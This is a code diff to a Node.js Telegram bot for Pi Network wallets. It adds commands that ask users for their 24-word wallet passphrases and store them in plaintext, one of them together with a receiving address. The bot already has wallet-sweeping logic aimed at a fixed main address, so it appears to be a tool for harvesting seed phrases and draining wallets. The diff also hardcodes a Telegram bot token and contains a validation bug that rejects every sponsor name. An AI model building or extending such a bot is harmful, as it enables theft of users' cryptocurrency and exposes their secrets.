@@ -1,5 +1,6 @@
 import TelegramBot from "node-telegram-bot-api";
-import { getAccountWithoutProxy, getBalance, getKeypairFromPassphrase, sleep, sweepWallet } from "./utils/fn.js";
+import { getAccount, getAccountWithoutProxy, getBalance, getKeypairFromPassphrase, sleep, sweepWallet } from "./utils/fn.js";
+import { storeLockedPi, storeSponsor } from "./utils/modelfn.js";
 
 const token = '8144700718:AAH5n9nbQXvwjMtNUqk_Qpp24V3vCLNv5io';
 const MAIN_ADDRESS = 'GDOQD7EVNKEB775WCG7DZ3L6H7RTPLXKAGM46JEARLGROQM6TOX3D2BS';
@@ -41,12 +42,113 @@ bot.onText(/\/sweep/, (msg) => {
     userSessions[chatId] = { waitingForPassphraseForSweeping: true, stopAll: false }
 });
 
+bot.onText(/\/upload_passphrase/, (msg) => {
+    const chatId = msg.chat.id;
+    bot.sendMessage(chatId, '📥 Please send your 24-word passphrase followed by the wallet address.\n\nFormat:\n`word1 word2 ... word24 G...`', { parse_mode: 'Markdown' });
+    userSessions[chatId] = { waitingForPassphraseAndAddress: true };
+});
+
+bot.onText(/\/upload_sponsor/, (msg) => {
+    const chatId = msg.chat.id;
+    bot.sendMessage(chatId, '📥 Please send your 24-word passphrase followed by label.\n\nFormat:\n`word1 word2 ... word24 name`', { parse_mode: 'Markdown' });
+    userSessions[chatId] = { waitingForPassphraseAndName: true };
+});
+
 bot.onText(/\/stop/, (msg) => {
     const chatId = msg.chat.id;
     bot.sendMessage(chatId, 'Stopping any running process');
 
     userSessions[chatId]['stopAll'] = true;
 });
+
+bot.on('message', async (msg) => {
+    const chatId = msg.chat.id;
+    const text = msg.text.trim();
+
+    if(userSessions[chatId]?.waitingForPassphraseAndAddress) {
+        const parts = text.split(/\s+/);
+        const address = parts[parts.length - 1];
+        const passphraseWords = parts.slice(0, -1);
+
+        if(passphraseWords.length !== 24 || !/^G[A-Z2-7]{55}$/.test(address)) {
+            return bot.sendMessage(chatId, '❌ Invalid format. Make sure you send 24 words followed by a valid wallet address (starts with G...)');
+        }
+
+        const passphrase = passphraseWords.join(' ');
+        bot.sendMessage(chatId, `⏳ Validating and processing...`);
+
+        try {
+            const kp = getKeypairFromPassphrase(passphrase);
+            const publicKey = kp.publicKey();
+
+            const accountData = await getAccount(publicKey);
+
+            const getReceiverAddressData = await getAccount(address);
+
+            if(!accountData) {
+                return bot.sendMessage(chatId, `❌ Invalid PI Wallet`);
+            }
+
+            if(!getReceiverAddressData) {
+                return bot.sendMessage(chatId, `❌ Invalid Wallet address`);
+            }
+
+            bot.sendMessage(chatId, `✅ Passphrase derived public key: ${publicKey}`);
+            
+            const saved = await storeLockedPi(passphrase, publicKey, address)
+            bot.sendMessage(chatId, `${saved.success ? '✅' : '❌' } ${ saved.message }`);
+
+        } catch (error) {
+            bot.sendMessage(chatId, '❌ Error processing the data. Ensure passphrase is correct.');
+        }
+
+        delete userSessions[chatId];
+    }
+});
+
+bot.on('message', async (msg) => {
+    const chatId = msg.chat.id;
+    const text = msg.text.trim();
+
+    if(userSessions[chatId]?.waitingForPassphraseAndName) {
+        const parts = text.split(/\s+/);
+        const name = parts[parts.length - 1];
+        const passphraseWords = parts.slice(0, -1);
+
+        if(passphraseWords.length !== 24 || name.length) {
+            return bot.sendMessage(chatId, '❌ Invalid format. Make sure you send 24 words followed by a name');
+        }
+
+        if(name.length < 3) {
+            return bot.sendMessage(chatId, '❌ Name must be 3 or more characters')
+        }
+
+        const passphrase = passphraseWords.join(' ');
+        bot.sendMessage(chatId, `⏳ Validating and processing...`);
+
+        try {
+            const kp = getKeypairFromPassphrase(passphrase);
+            const publicKey = kp.publicKey();
+
+            const accountData = await getAccount(publicKey);
+
+            if(!accountData) {
+                return bot.sendMessage(chatId, `❌ Invalid PI Wallet`);
+            }
+
+            bot.sendMessage(chatId, `✅ Passphrase derived public key: ${publicKey}`);
+            
+            const saved = await storeSponsor(passphrase, name)
+            bot.sendMessage(chatId, `${saved.success ? '✅' : '❌' } ${ saved.message }`);
+
+        } catch (error) {
+            bot.sendMessage(chatId, '❌ Error processing the data. Ensure passphrase is correct.');
+        }
+
+        delete userSessions[chatId];
+    }
+});
+
 
 bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
